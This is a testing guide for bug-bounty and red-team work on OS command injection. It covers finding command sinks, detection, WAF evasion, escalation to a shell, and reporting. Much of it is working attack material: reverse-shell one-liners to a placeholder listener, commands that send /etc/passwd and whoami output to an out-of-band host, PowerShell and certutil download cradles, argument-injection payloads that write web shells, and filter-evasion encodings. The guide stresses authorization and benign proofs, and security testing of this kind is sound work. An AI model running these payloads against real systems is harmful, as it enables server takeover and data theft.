# OS Command Injection — Complete In-Depth Testing Guide (Expert / Bug-Bounty & Red-Team Edition)

**Author:** x8bitranjit
**Scope:** Any feature where user input reaches an **OS command / shell** — network tools (ping/traceroute/nslookup/whois), file converters (ImageMagick/ffmpeg/LibreOffice/wkhtmltopdf), archive handlers (tar/zip/unzip), backup/export/import, git/svn operations, DNS/host lookups, PDF/thumbnail generators, "run script", admin diagnostics, and any sink calling `system/exec/popen/backticks/Runtime.exec/child_process/os.system`
**Platforms:** Linux targets first-class; Windows command-injection covered; Kali/WSL for tooling
**Companion files in this folder:**
- `COMMAND_INJECTION_ARSENAL.md` — separators, blind/OOB payloads, WAF-evasion (IFS/quoting/encoding), reverse shells (copy-paste)
- `COMMAND_INJECTION_CHECKLIST.md` — the testing-order checklist you tick per sink
- `COMMAND_INJECTION_REPORT_TEMPLATE.md` — the report skeleton that gets paid
- `poc/` — runnable tooling (injection fuzzer, OOB/time-blind detector, reverse-shell generator, evasion builder)

> **Companion to the SSTI / LFI / RFI / FileUpload / SSRF guides.** Command injection is the **most directly Critical** web class: a single payload can hand you a **shell on the server.** There's almost no "is this impactful?" debate — if user input reaches a shell and you can append a command, it's **RCE**. The mistake hunters make is (a) not detecting the **blind** cases (no output → use time/OOB), and (b) giving up at a WAF instead of evading it. Read Part II (detection) and Part III (evasion + escalation) — that's where blind/filtered command injection becomes a confirmed Critical.

---

> ### ⚡ READ THIS FIRST — why command injection is (almost) always Critical
> 1. **If your command runs, it's RCE — Critical.** The entire report is **proving execution** and demonstrating impact safely. You rarely need to argue severity; you need a clean PoC (a benign marker command) and restraint (§19).
> 2. **Most real command injection is BLIND.** The app won't echo command output. So confirm with **time delays** (`;sleep 10`) and **out-of-band** callbacks (`;nslookup x.oob`, `;curl http://oob`) — and **exfiltrate** blind output through DNS/HTTP. If you only test in-band, you'll miss the majority (§7/§8).
> 3. **Separators are the whole game (in-band):** `;` `|` `||` `&` `&&` newline `` `cmd` `` `$(cmd)`. You're breaking out of the intended command and appending yours. Find which the shell honors (§6).
> 4. **Argument injection is the sneaky sibling.** When your input becomes an **argument** (not a full command), you can't add `;`, but you can inject **flags** (`-o`, `--output`, `--upload-file`, `-d`) that turn a benign tool into file-write/SSRF/RCE (e.g., `curl`, `tar`, `ffmpeg`, `git`). Always consider it when separators are filtered (§9).
> 5. **A WAF/blacklist is not the end.** Spaces → `${IFS}`; quotes/concatenation → `w'h'oami`, `c\at`; encoding → `echo <b64>|base64 -d|bash`; globbing → `/???/c?t /etc/passwd`. Filtered command injection is still Critical once you evade (§10).
>
> **Where the money is (memorize this order):** ① **confirmed command execution → shell → full server compromise — Critical** → ② **blind command injection proven via time/OOB + output exfil — Critical** → ③ **argument injection → file write / SSRF / RCE — High–Critical** → ④ **filtered/WAF'd injection evaded to execution — Critical** → ⑤ *then* unconfirmed "special char reflected" as a **lead**, not a finding.

---

## Table of Contents

**▶ [Master Testing Sequence — the testing order](#master-testing-sequence--the-testing-order)**

**PART I — FOUNDATIONS, RECON & BASELINE**
1. [Environment & Tooling Setup](#1-environment--tooling-setup)
2. [Command-Injection Anatomy — Sinks, Shell-vs-exec & Why It Pays](#2-command-injection-anatomy)
3. [Reconnaissance — Find Every Command Sink](#3-reconnaissance--find-every-command-sink)
4. [Baseline — Detect & Classify (in-band / blind / argument)](#4-baseline--detect--classify)

**PART II — DETECTION (work in this order)**
5. [In-Band Detection (separators & output)](#5-in-band-detection)
6. [Operators by Shell/OS (Linux & Windows)](#6-operators-by-shellos)
7. [Blind: Time-Based Detection](#7-blind-time-based-detection)
8. [Blind: Out-of-Band (OOB) Detection & Exfiltration](#8-blind-out-of-band-detection--exfiltration)
9. [Argument / Option Injection](#9-argument--option-injection)

**PART III — BYPASS & EXPLOITATION BY IMPACT (where the money is)**
10. [WAF / Blacklist / Filter Evasion](#10-waf--blacklist--filter-evasion)
11. [Command Injection → Shell (the whole point)](#11-command-injection--shell)
12. [Blind Data Exfiltration (DNS/HTTP/timing)](#12-blind-data-exfiltration)
13. [Post-RCE: Proving Impact Safely & Pivoting](#13-post-rce-proving-impact-safely--pivoting)
14. [Special Sinks (ImageMagick, ffmpeg, git, tar, Windows)](#14-special-sinks)

**PART IV — VALIDITY, SEVERITY & REPORTING (the bug-bounty layer)**
15. [The Validity-First Mindset](#15-the-validity-first-mindset)
16. [False Positives — STOP reporting these](#16-false-positives--stop-reporting-these-auto-reject-list)
17. [Severity Calibration](#17-severity-calibration--how-triagers-really-rate-command-injection)
18. [Impact-Escalation Playbooks — "you found X, now do Y"](#18-impact-escalation-playbooks--you-found-x-now-do-y)
19. [Building a Professional, Safe PoC](#19-building-a-professional-safe-poc)
20. [Reporting, CWE/CVSS & De-duplication](#20-reporting-cwecvss--de-duplication)
21. [Automation & Red-Team Notes](#21-automation--red-team-notes)

**Appendices**
- [Appendix A — Command-Injection Workflow Cheat Sheet](#appendix-a--command-injection-workflow-cheat-sheet)
- [Appendix B — Command-Injection Decision Tree](#appendix-b--command-injection-decision-tree)
- [Appendix C — Important Links](#appendix-c--important-links)

---

# Master Testing Sequence — The Testing Order

> **This is the spine.** Work top-to-bottom. Numbered sections (1–21) are reference detail; this is the order you execute.

```
PHASE 0  RECON & LAB      → find every feature that runs a command (network tools/converters/archives/etc.) + OOB (§3/§1)
PHASE 1  BASELINE  ★      → inject benign markers; classify: in-band / blind / argument-only; which OS/shell (§4)
PHASE 2  DETECT           → in-band separators (§5/§6) → time-based (§7) → OOB callback + exfil (§8) → arg injection (§9)
PHASE 3  EVADE            → defeat the WAF/blacklist: IFS spaces · quoting/concat · encoding · globbing (§10)
PHASE 4  IMPACT  ⭐ (money)→ command exec → shell (§11) · blind exfil (§12) · prove safely + pivot (§13) · special sinks (§14)
PHASE 5  VALIDATE→REPORT  → validity (§15) · false-positive filter (§16) · severity+CVSS+CWE-78 (§17) ·
                            SAFE PoC: benign marker, no persistence (§19) · dedup (§20) · report template
```

**Phase-by-phase, with the deliverable before moving on:**

1. **PHASE 0 — Recon & lab.** Enumerate **every** feature that shells out (§3). Stand up an **OOB listener** (interactsh) for blind detection/exfil (§1). *Deliverable:* a list of command sinks + a live OOB host.
2. **PHASE 1 — Baseline ⭐.** Inject benign markers; determine **in-band vs blind vs argument-only** and the OS/shell (§4). *Deliverable:* a sink classified by observability.
3. **PHASE 2 — Detect.** Confirm injection: in-band separators (§5/§6), then time-based (§7), then OOB callback + start exfil (§8); if input is an argument, test option injection (§9). *Deliverable:* confirmed command execution (in-band/time/OOB).
4. **PHASE 3 — Evade.** If a filter/WAF blocks payloads, evade it (IFS/quoting/encoding/globbing) (§10). *Deliverable:* a payload that executes despite the filter.
5. **PHASE 4 — Impact ⭐.** Escalate to a shell (§11), exfiltrate blind output (§12), prove safely and pivot (§13); exploit special sinks (§14). *Deliverable:* demonstrated RCE (benign marker / shell).
6. **PHASE 5 — Validate → report.** Apply validity & FP filters (§15/§16), set CVSS/CWE-78 (§17), build a *safe* PoC (§19), de-dup, write it (§20). *Deliverable:* the submitted report.

Reference anytime: payloads → `COMMAND_INJECTION_ARSENAL.md`; checklist → `COMMAND_INJECTION_CHECKLIST.md`; scripts → `poc/`; playbooks **§18**.

---

# PART I — FOUNDATIONS, RECON & BASELINE

# 1. Environment & Tooling Setup

| Tool | Job |
|------|-----|
| **Burp Suite** (Repeater/Intruder) | tamper params/headers/body; replay; the core tool |
| **interactsh / Burp Collaborator** | OOB callback — **essential** for blind detection + DNS/HTTP exfil |
| **`poc/cmdi_fuzz.py`** | spray separators/markers, detect in-band + time + OOB |
| **`poc/oob_listen.md`** | how to stand up a DNS/HTTP OOB catcher (interactsh) |
| **`poc/revshell.py`** | generate reverse-shell one-liners (bash/nc/python/php/powershell) |
| **`poc/evasion.py`** | build WAF-evasion variants of a command (IFS/quote/encode/glob) |
| **commix** | automated command-injection exploitation (verify by hand) |
| **a listener** (`nc -lvnp 4444`) | catch reverse shells (authorized engagements) |
| **ffuf / Intruder** | fuzz the separator/evasion set across many params |

```bash
# Kali/WSL
interactsh-client -v                      # your OOB host for blind detection + exfil
python3 poc/cmdi_fuzz.py -u "https://target/ping?host=FUZZ" --oob YOURID.oast.pro
python3 poc/revshell.py --lhost YOUR_IP --lport 4444 --type bash
```
> **The OOB host is essential.** Most command injection is **blind**; an interactsh DNS/HTTP hit (with the server's source IP) both *confirms* execution and is your *exfil channel* for blind output. Set it up first.

> **Windows:** drive Burp on Windows; run the Python `poc/` helpers, commix, and listeners in **WSL**. For **Windows targets**, swap to `&`/`|`, `%OS%`, `powershell`, and Windows reverse shells (§6/§11).

---

# 2. Command-Injection Anatomy

## 2.1 What it is
User input is concatenated into a string that the app passes to a **shell** (or to a program with shell-style argument parsing). By injecting shell metacharacters, you terminate the intended command and run your own — or you inject **arguments** that change a program's behavior.

## 2.2 The two flavors (decides your technique)
```
CLASSIC (shell) injection: input → system("ping " + host) → host=`;id` runs `id`.       → separators (§5/§6).
ARGUMENT injection:        input → exec(["curl", input]) → input="-o/tmp/x http://.."     → inject FLAGS (§9).
```

## 2.3 Observability classes (decides detection)
```
IN-BAND   → command output is returned to you (you SEE `id`).                 Easiest.
TIME      → no output, but you can cause a measurable DELAY (`;sleep 10`).     A timing oracle.
OOB/BLIND → no output/delay reflected, but the server can make a DNS/HTTP hit. Confirm + exfil via callback (§8/§12).
```

## 2.4 Where command sinks live
```
□ Network tools:    ping/traceroute/nslookup/dig/whois/host/curl/wget "test connectivity" features.
□ Converters:       image resize/convert (ImageMagick), video (ffmpeg), docs (LibreOffice/wkhtmltopdf), PDF gen.
□ Archives:         tar/zip/unzip/7z "extract"/"compress"/"backup"/"export" features.
□ Dev/ops:          git/svn clone/pull, build/deploy hooks, "run script", cron editors, log/diagnostic tools.
□ Params/headers:   any value that ends up in a command — query/body params, filenames, Host/UA/headers, even
                    metadata (image EXIF, filename of an upload) consumed by a shell-out.
□ Sinks (grep src/JS): system() exec() shell_exec() passthru() popen() proc_open() `backticks` (PHP) ·
                    os.system()/subprocess(shell=True) (Py) · child_process.exec()/execSync() (Node) ·
                    Runtime.exec()/ProcessBuilder (Java) · Process.Start (.NET) · Open3/`` `cmd` `` (Ruby)
```

## 2.5 Why it pays
- **Immediate, total compromise** — a shell on the app server: data, secrets, source, lateral movement.
- **Cloud/identity** — from the shell you read instance metadata creds, k8s tokens → cloud takeover.
- **No exotic preconditions** — often a single unauthenticated request to a diagnostic feature.

> **The mental model:** command injection means **the application is typing into a shell for you.** Severity is Critical by default; your craft is in *detecting the blind cases* and *evading filters* to prove it.

---

# 3. Reconnaissance — Find Every Command Sink

```
□ Obvious tools:   anything described as "ping", "lookup", "test", "validate URL/host", "trace", "whois".
□ Processing:      upload→convert/resize/transcode/thumbnail; "export PDF/CSV"; "backup"; "import".
□ Filenames:       features that put a user-controlled FILENAME into a shell command (zip/convert/move).
□ Headers/metadata: User-Agent/Referer/X-Forwarded-* logged then processed; EXIF/filename consumed by a converter.
□ Source/JS recon (JS-files kit): grep for exec/system/spawn/Runtime.exec/subprocess with user input.
□ Hidden/admin:    diagnostic/ops endpoints, "run command", health checks, plugin/installer hooks.
□ Indirect:        a stored value (hostname/path in a profile/config) later used in a job → second-order injection.
```
> **If this → then that:** a **host/IP input + a "ping/lookup" result** is shown → classic in-band candidate; go to §5 immediately. A **converter/archive/PDF** feature → both command injection (filenames/options) and special-sink exploits (ImageMagick/ffmpeg, §14). A value that's **logged then processed** → second-order injection — plant a payload and watch the OOB.

---

# 4. Baseline — Detect & Classify

**Do this before deep payloads.** Establish whether you have in-band, time, or OOB observability, and the OS.

## 4.1 Quick classification probes
```
In-band marker:   host=127.0.0.1;echo CMDI-7f3a9        → "CMDI-7f3a9" in response?  → IN-BAND.
Math/echo:        host=`expr 7 \* 7`  /  $(echo 49)       → "49" appears?              → IN-BAND.
Time:             host=127.0.0.1;sleep 10                 → response ~10s slower?       → TIME (blind).
OOB:              host=127.0.0.1;nslookup CMDI.YOURID.oast.pro  → DNS hit at interactsh?→ OOB (blind).
OS hint:          ;ver (Windows) vs ;uname (Linux); & vs ; behavior; backslash handling.
```

## 4.2 Determine where in the command you land
```
□ Full-command context (separators work)?   → §5/§6.
□ Argument context (your input is one arg)?  → option injection (§9).  (separators may be quoted/escaped away)
□ Quoted context?   try to break the quote: host=127.0.0.1"; id; "   /  '; id; '
```

## 4.3 Note what you'll need next
- **OS/shell** → which operators and reverse shell (§6/§11).
- **Observability** → in-band (read output directly), time (oracle), OOB (callback + exfil, §8/§12).
- **Filtering?** → which characters are blocked → plan evasion (§10).

> **Don't conclude "not vulnerable" from no echoed output.** Silence usually means **blind**, not safe. Always run the **time** and **OOB** probes before moving on — they catch the majority of real command injection.

---

# PART II — DETECTION (work in this order)

> Full payload lists are in `COMMAND_INJECTION_ARSENAL.md`.

# 5. In-Band Detection

Break out of the intended command and append yours; read the output in the response.
```
;id            | id            || id           & id          && id
`id`           $(id)          %0a id  (newline)  \n id
127.0.0.1;id   127.0.0.1| id   127.0.0.1%0aid
"; id; "       '; id; '        )%3bid                (break quotes/parens)
```
Confirm with a **deterministic marker** the app can't produce by itself: `echo CMDI-<rand>`, `$(echo 49)`, `id`/`whoami`.

> **If this → then that:** `;id` (or one of the operators) returns `uid=...` → **confirmed in-band RCE**; go to impact (§11). If output isn't reflected but the request **errored differently** or **took longer**, switch to time/OOB (§7/§8).

---

# 6. Operators by Shell/OS

```
LINUX (sh/bash):
  ;        run next regardless           cmd1 ; cmd2
  |        pipe stdout                    cmd1 | cmd2
  ||       run cmd2 if cmd1 FAILS         cmd1 || cmd2
  &        background cmd1, run cmd2      cmd1 & cmd2
  &&       run cmd2 if cmd1 SUCCEEDS      cmd1 && cmd2
  `cmd` $(cmd)   command substitution     ping `id`
  newline (%0a / \n)                      cmd1\ncmd2

WINDOWS (cmd.exe):
  &  &&  |  ||   (same logic as above)    dir & whoami
  %0a sometimes; FOR loops for evasion
WINDOWS (PowerShell):
  ;   |   `n     `cmd`-style via $()       Get-Content; whoami     IEX(...)
```
> **If this → then that:** `;`/`&&` are filtered → try `|`, `` ` ``/`$()`, or a **newline** (`%0a`). On Windows, `&` and `|` are your primary separators and `||` is great for blind (runs when the first command "fails" on a bad host). Command substitution (`` `id` ``/`$(id)`) often works where separators are stripped.

## 6.1 Context-aware breakout (quotes / parentheses / escaping)
Where your input lands inside the command string decides which characters you must emit **first** to break out. Probe the context (does your `"`/`'` cause an error or change behavior?), then prepend the matching closer:
```
Unquoted:   system("ping "+host)         → host = 127.0.0.1; id            (separator works directly)
Double-q:   system("ping \""+host+"\"")  → host = 127.0.0.1"; id; "        (close ", inject, reopen ")
                                            host = 127.0.0.1"; id #          (close ", inject, comment rest — sh # / cmd ::)
Single-q:   system("ping '"+host+"'")     → host = 127.0.0.1'; id; '        (single quotes don't allow $()/`` inside — must close)
                                            host = 127.0.0.1'$(id)'          (only after closing the quote)
Backtick:   already inside `...`          → close it: 127.0.0.1` ; id ; `
Inside $(): already in $(cmd arg)         → )  ; id ; echo $(  (balance parens)
Escaped/sanitized quotes (\" stripped):   try newline %0a (ignores quoting), or $IFS, or a context that doesn't quote.
Argument-only (no breakout possible):     pivot to OPTION injection (§9) — you can't add a separator, but you can add flags.
```
> **The method:** send `127.0.0.1'` and `127.0.0.1"` separately — whichever throws a shell/parse error tells you the quote you're inside. Then use the matching breakout. If both are escaped/stripped, fall back to a **newline** (`%0a`, which most shells treat as a command separator regardless of quoting) or to **argument injection** (§9). Getting the context right is why a "filtered" target still pops.

---

# 7. Blind: Time-Based Detection

No output → make the server **wait**, and measure it.
```
Linux:    127.0.0.1;sleep 10        `sleep 10`    $(sleep 10)    || sleep 10    & sleep 10
          ping -c 10 127.0.0.1      (10s delay)   ;ping -c 10 127.0.0.1
Windows:  & ping -n 10 127.0.0.1    & timeout 10
Confirm:  baseline (no payload) vs payload — a consistent ~10s delta = execution. Re-test 2-3x to rule out jitter.
Tune:     use a distinctive delay (e.g. 7s) and compare; binary-search booleans with conditional sleeps:
          ;if [ $(whoami|cut -c1) = r ]; then sleep 10; fi    → exfil data 1 char at a time via timing.
```
> **If this → then that:** `;sleep 10` reliably adds ~10s (vs a fast baseline, repeated) → **confirmed blind command injection**. You can now **exfiltrate** via conditional sleeps (slow) or, much faster, via OOB (§8/§12). Always re-test to exclude network jitter — a single slow response isn't proof.

## 7.1 Boolean / response-difference blind (when time AND OOB are unavailable)
Sometimes you can't sleep reliably (no `sleep`/`ping`, or unstable latency) and OOB egress is fully blocked — but the **response still changes** depending on whether your injected command **succeeded or errored**. Infer execution from that differential, like boolean-based SQLi:
```
The oracle = any observable difference tied to command success/failure:
  - status code / body length / an error string when the SECOND command fails vs succeeds:
      ;true        vs   ;false               → different page? command separator is executing.
      `id`         vs   `idxxxxx`            → valid vs invalid command → error text only on the invalid one.
  - command-substitution that changes echoed output:
      ?host=127.0.0.1$(echo)        vs   ?host=127.0.0.1$(echobad)   → output differs if substitution runs
  - conditional that gates a visible action WITHOUT timing:
      ;[ -f /etc/passwd ] && echo OK            (look for "OK"/changed output)
      ;cat /etc/passwd|grep -q root && <something observable>
  - DATA via boolean oracle (no timing): 1 char at a time using a visible true/false signal:
      ;[ $(id -u) -eq 0 ] && <true-branch observable>      → are we root?
      ;[ "$(whoami|cut -c1)" = "r" ] && <true-branch observable>
```
> **If this → then that:** no `sleep`/`ping`, latency too noisy for timing, AND OOB is blocked → fall back to a **boolean oracle**: find any response difference between a command that **succeeds** and one that **fails** (`;true`/`;false`, valid vs invalid command, a `[ … ] && <observable>`), confirm it's stable, then read data **one character at a time** through that true/false signal. Slower than OOB but it confirms RCE (and exfils) on the most locked-down targets — still **Critical**.

---

# 8. Blind: Out-of-Band (OOB) Detection & Exfiltration

The fastest, most reliable blind confirmation — and your data channel.
```
DNS (works even when HTTP egress is blocked):
  127.0.0.1;nslookup CMDI.YOURID.oast.pro
  ;dig CMDI.YOURID.oast.pro     ;host CMDI.YOURID.oast.pro
HTTP:
  ;curl http://YOURID.oast.pro/CMDI     ;wget http://YOURID.oast.pro/CMDI     ;curl YOURID.oast.pro
EXFIL command output INTO the callback (DNS-safe encoding):
  ;nslookup $(whoami).YOURID.oast.pro                       → subdomain = whoami
  ;curl http://YOURID.oast.pro/$(id|base64)                 → path = base64(id)
  ;curl http://YOURID.oast.pro/?d=$(cat /etc/passwd|base64) (HTTP)  /  chunk for DNS label limits
```
> **If this → then that:** an interactsh **DNS hit** appears from the server IP → blind command injection **confirmed** (DNS often escapes egress filters that block HTTP). Then **exfiltrate** real proof by putting `$(whoami)`/`$(hostname)` (or base64'd file content) into the callback hostname/path (§12). DNS-only confirmation from the **server** IP is solid evidence.

---

# 9. Argument / Option Injection

When your input becomes a **single argument** (not the whole command), separators won't help — but **injecting flags** can. The program does exactly what its options say.
```
curl arg:   input="-o /var/www/html/shell.php http://YOUR_IP/shell.php"  → writes a web shell (RCE) ·  --upload-file (exfil) · -K (config file)
tar arg:    input="--checkpoint=1 --checkpoint-action=exec=sh shell.sh"  → tar runs a command (RCE)
            input="-I /bin/sh -c id"   (compress program injection)
ffmpeg:     a crafted input/playlist → file read/SSRF (§14)
zip/unzip:  --unzip-command / -TT cmd  → command execution on extraction
git:        input="--upload-pack=... " / ext::sh -c ...  (git protocol arg injection) → RCE
wget:       input="--output-document=/path ..." / -O / --post-file (exfil)
find/sed/awk reached: -exec / e modifier → command exec
rsync:      -e / --rsh   → command exec
```
> **If this → then that:** separators are filtered/escaped but your value lands as an **argument** to a known tool → inject the tool's dangerous **flags**: `curl -o <webroot>/shell.php` (file write→RCE), `tar --checkpoint-action=exec=`, `git ext::sh`. Argument injection turns a "safe" parameterized exec into RCE. Identify the tool (from errors/behavior/source) and use its option set.

---

# PART III — BYPASS & EXPLOITATION BY IMPACT (where the money is)

> Every PoC uses a **benign marker** (`id`/unique echo/unique OOB host) and **no persistence**; reverse shells only on explicitly authorized red-team engagements (§19).

# 10. WAF / Blacklist / Filter Evasion

A filter blocks characters/words; route around it.
```
SPACES blocked:        cat${IFS}/etc/passwd     cat$IFS$9/etc/passwd     {cat,/etc/passwd}     cat</etc/passwd
                       X=$'\x20';cat${X}/etc/passwd     tab (%09)
SLASH blocked:         ${HOME:0:1}  (=/)        $(echo . | tr '.' '/')   base64 the path
KEYWORD blocked (cat): c''at  c\at  "c"at  ca''t   /bin/c?t   $(rev<<<tac)   tac/rev   head/less/more/nl
                       wh''oami   who$@ami   w\ho\am\i
QUOTES help concat:    w'h'o'a'm'i   c"a"t  /e"t"c/p"a"sswd
ENCODING:              echo d2hvYW1p|base64 -d|bash       printf '\167\150...'|sh      $(printf whoami)
                       echo -e "\x77\x68\x6f\x61\x6d\x69"|sh
GLOBBING (no literal names): /???/c?t /etc/passwd     /bin/?????32 (windows)    /e??/p??swd
NEWLINE / SEPARATOR swap: %0a  %0d  ;  |  ||  &&   $IFS
CASE / VAR EXPANSION:   $(tr A-Z a-z<<<WHOAMI)   ${PATH:0:1}
COMMAND SUB if ; blocked: `cmd`  $(cmd)
```
```bash
python3 poc/evasion.py --cmd "cat /etc/passwd" --block "space,cat"    # prints working variants
```
> **If this → then that:** the WAF blocks spaces → **`${IFS}`** (or `{cmd,arg}` brace expansion, or `<`) is the canonical bypass. It blocks the word `cat`/`whoami` → break it with quotes/backslashes (`c''at`, `w\ho\am\i`) or globbing (`/???/c?t`). It blocks everything → **base64-decode-pipe** (`echo <b64>|base64 -d|bash`). One layer at a time; combine as needed.

---

# 11. Command Injection → Shell

Once a command runs, build from benign proof to (authorized) interactive shell.
```
1. BENIGN PROOF (always first):  id ; whoami ; hostname ; uname -a   → identity/host (Critical proof).
2. READ (minimal):               cat /etc/passwd | head ; ls -la ; env   (env may leak secrets — redact).
3. INTERACTIVE (authorized only): reverse shell to your listener:
   bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
   python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn("bash")'
   nc YOUR_IP 4444 -e /bin/sh        (if nc supports -e)        mkfifo-based nc if not
   Windows: powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('YOUR_IP',4444);..."  (full one-liner in arsenal)
   (use poc/revshell.py to generate; URL-encode for the request)
```
> **If this → then that:** `id` returns `uid=...` → you have RCE; for **bug bounty**, a single `id`/`whoami` (or an OOB callback carrying `$(whoami)`) is a **complete Critical** — you do **not** need a reverse shell. For an authorized **red-team** engagement, drop a shell, then pivot (§13) and clean up.

---

# 12. Blind Data Exfiltration

When you can't see output, exfiltrate it through the OOB channel.
```
DNS exfil (escapes most egress filters; mind label/length limits → chunk):
  ;nslookup $(whoami).YOURID.oast.pro
  ;for c in $(cat /etc/passwd|base64|head -c 200|fold -w60); do nslookup $c.YOURID.oast.pro; done
HTTP exfil (when HTTP egress is allowed):
  ;curl -s http://YOURID.oast.pro/?d=$(id|base64)
  ;curl -s --data-binary @/etc/passwd http://YOURID.oast.pro/p
Timing exfil (last resort, 1 bit at a time):
  ;if [ "$(id -u)" = "0" ]; then sleep 10; fi          → root? then it's slow.
Encode to survive DNS:  base64 / hex / xxd ; strip '=' ; fold to label length.
```
> **If this → then that:** blind injection + DNS egress → exfil `$(whoami)`/`$(hostname)`/the first lines of a secret file as a **base64 subdomain** to interactsh. That converts "the server made a DNS request" into "**here is the server's hostname/user/secret** I read via RCE" — a far stronger PoC than a bare callback.

---

# 13. Post-RCE: Proving Impact Safely & Pivoting

```
PROVE (report-grade, minimal):
  □ id / whoami / hostname / uname -a   → user + host (Critical proof). 
  □ a unique echoed/OOB marker          → unambiguous, benign.
PIVOT (authorized engagements; read-only for the report):
  □ read app config/.env → DB/cloud creds (validate read-only, redact) → lateral movement.
  □ cloud metadata from the box: curl http://169.254.169.254/... (SSRF kit §11) → IAM creds → cloud takeover.
  □ k8s SA token /var/run/secrets/... → cluster; internal recon from inside (SSRF/internal kits).
CLEAN UP:
  □ remove anything you wrote (web shells, dropped files); kill reverse shells; don't persist; note artifacts.
```
> **The restraint:** for bug bounty, **`id` (or an OOB `whoami`) and stop.** RCE is already the top severity; reading customer data or planting persistence adds risk, not bounty. Same discipline as the RFI/LFI/SSRF guides.

---

# 14. Special Sinks (ImageMagick, ffmpeg, git, tar, Windows)

```
ImageMagick (ImageTragick CVE-2016-3714 & friends): upload a crafted image/SVG/MVG whose content triggers a
  delegate command → RCE. Test convert/resize/thumbnail features with a malicious .mvg/.svg (FileUpload kit overlap).
  e.g. MVG with:  fill 'url(https://x"|id ">)'   /  msl/ephemeral/https delegate abuse.
ffmpeg / video: crafted playlist (.m3u8/.avi) → file read / SSRF (read /etc/passwd via concat protocol); some builds → RCE.
LibreOffice / wkhtmltopdf / Ghostscript: doc/PDF conversion → -dSAFER bypass (Ghostscript) → RCE; wkhtmltopdf → SSRF/file read.
git: clone/pull of a URL → ext::sh, --upload-pack, hooks → RCE.
tar / zip: filename "--checkpoint-action=exec=" / compress-program injection → RCE on extract.
Windows: & whoami ; | ; ^ escaping ; powershell IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/s.ps1')
         FOR /F loops to evade char filters; %CD% etc.
```
> **If this → then that:** the sink is a **converter/processor** (ImageMagick/ffmpeg/Ghostscript/git/tar) → the injection often isn't a shell separator but a **crafted input file / option** that makes the tool run a command (cross-ref the **FileUpload kit** for getting the malicious file accepted). These known sinks are reliable Criticals; match the payload to the exact tool/version.

## 14.1 Windows command injection (deep): cmd.exe, PowerShell, cradles, DOSfuscation
Windows behaves very differently from `sh` — most "Linux didn't work" cases are Windows targets. Detect with `&ver` / `&echo %OS%` (cmd) and `;$PSVersionTable` (PowerShell).
```
SEPARATORS (cmd.exe):  &  &&  |  ||      e.g.  127.0.0.1 & whoami      127.0.0.1 || whoami   (great blind on a bad host)
ESCAPING:              ^ escapes the next char (defeats some filters):  w^h^o^a^m^i   ;   "" splits tokens:  who""ami
ENV-VAR SUBSTRING (build a blocked word without typing it):  %COMSPEC:~-7,3%  →  "exe"-style slices ; set a var then slice.
DELAYED EXPANSION / FOR loops (DOSfuscation):  for /f %i in ('whoami') do @echo %i   ; cmd /v:on /c "set x=who&&set y=ami&&!x!!y!"
DOWNLOAD CRADLES (cmd):    certutil -urlcache -split -f http://YOUR_IP/s.exe s.exe & s.exe
                           bitsadmin /transfer j http://YOUR_IP/s.exe %TEMP%\s.exe & %TEMP%\s.exe
                           curl http://YOUR_IP/s.exe -o s.exe & s.exe        (curl ships in modern Win10/11)
POWERSHELL:               ; powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/s.ps1')"
                          ; powershell -enc <base64-UTF16LE>          (encoded command — bypasses quote/space filters)
                          ; powershell IWR http://YOUR_IP/s.ps1 -OutFile s.ps1; .\s.ps1
                          ; powershell -c "Invoke-Expression(...) "    ; iex (download cradle)
OOB / EXFIL (Windows):    & nslookup %COMPUTERNAME%.YOUR.oast.fun      & powershell Resolve-DnsName $env:USERNAME.YOUR.oast.fun
                          & curl http://YOUR.oast.fun/$(whoami)        (PowerShell: "$(whoami)")
BENIGN PROOF:             & echo CMDI-7f3a9    & whoami    & hostname    & ver
```
> **If this → then that:** Linux separators/`sleep` do nothing but `&ver`/`&whoami` returns output → it's **Windows**. Use `&`/`|` separators, `^`/`""` to evade char filters, **env-var substring** or **FOR loops** to rebuild blocked keywords, and **`powershell -enc`** when quotes/spaces are filtered. For a shell, a **download cradle** (`certutil`/`bitsadmin`/`curl`/PowerShell `IWR`/`IEX`) fetches your payload — but for bug bounty a single `whoami`/`echo` marker (or an OOB `%COMPUTERNAME%` callback) is enough proof. Mind: cmd uses `::`/`rem` not `#` for comments, and percent-vars (`%VAR%`) expand at parse time.

---

# PART IV — VALIDITY, SEVERITY & REPORTING

# 15. The Validity-First Mindset

## 15.1 The four questions a triager asks (answer them in your report)
1. **Did a command execute?** Show `id`/`whoami` output, a measured `sleep` delay, or an OOB hit from the server IP carrying your marker.
2. **What concrete impact?** RCE / shell / secret read / cloud creds. Name it.
3. **What does the attacker need?** Often just an unauthenticated request → low bar = Critical.
4. **Reproducible & in scope?** Exact endpoint/param, the payload (+ evasion), and the execution evidence.

## 15.2 The "reflected char vs execution" rule (most important)
| You have | Verdict | Why / next |
|---|---|---|
| A special char (`;`/`|`) reflected in output | Nothing yet | Not execution — need a command to run (§5). |
| `id`/`whoami` output returned | **In-band RCE → Critical** | Done — report (§17). |
| `;sleep 10` reliably delays (repeated) | **Blind RCE → Critical** | Strengthen with OOB/exfil (§8/§12). |
| OOB DNS/HTTP hit from server carrying `$(whoami)` | **Blind RCE → Critical** | Strong PoC (§12). |
| Argument injection → file write/SSRF/RCE | **High–Critical** | Show the resulting impact (§9). |
| Error mentions a command but nothing ran | Lead | Keep testing time/OOB/evasion. |

## 15.3 Production-scope discipline
Confirm on **production** with a benign marker; re-test time-based 2–3× to exclude jitter. Validate any read secrets read-only. Re-test partial fixes (blocking `;` but not `|`/`$()`, or spaces but not `${IFS}`, is a fresh valid finding).

---

# 16. False Positives — STOP reporting these (auto-reject list)

| # | Commonly mis-reported | Why it's NOT (by default) | When it IS valid |
|---|---|---|---|
| 1 | **A `;`/`|` reflected back in the response** | Reflection ≠ execution. | A command actually **runs** (output/delay/OOB) (§5/§7/§8). |
| 2 | **One slow response after `;sleep 10`** | Could be jitter/load. | A **repeated**, consistent delay vs baseline (§7). |
| 3 | **An error like "invalid host"** | Input validation, not execution. | You make a command run despite it. |
| 4 | **OOB hit you can't tie to your input/server** | Could be a scanner/your own tooling. | Hit from the **target server IP** triggered by your specific payload (§8). |
| 5 | **SSRF mislabeled as command injection** | The server fetched a URL, didn't run a command. | A shell command executed (SSRF kit otherwise). |
